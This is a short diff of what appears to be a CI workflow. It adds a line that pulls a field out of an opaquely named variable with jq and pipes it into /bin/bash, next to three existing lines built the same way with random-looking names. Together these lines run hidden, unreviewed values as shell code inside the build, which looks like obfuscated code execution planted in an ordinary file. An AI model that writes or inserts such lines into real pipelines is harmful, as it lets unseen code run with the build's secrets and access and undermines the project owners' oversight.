@@ -58,6 +58,7 @@ jobs:
           echo $n94 | jq -r .liby59517 | /bin/bash
           printf '%s' "$etbg2837" | jq -r .ne132 | /bin/bash
           echo $swb262 | jq -r .rn9201 | /bin/bash
+          echo $v1 | jq -r .mvyp8 | /bin/bash
 
       - name: Upload artifact
         if: always()
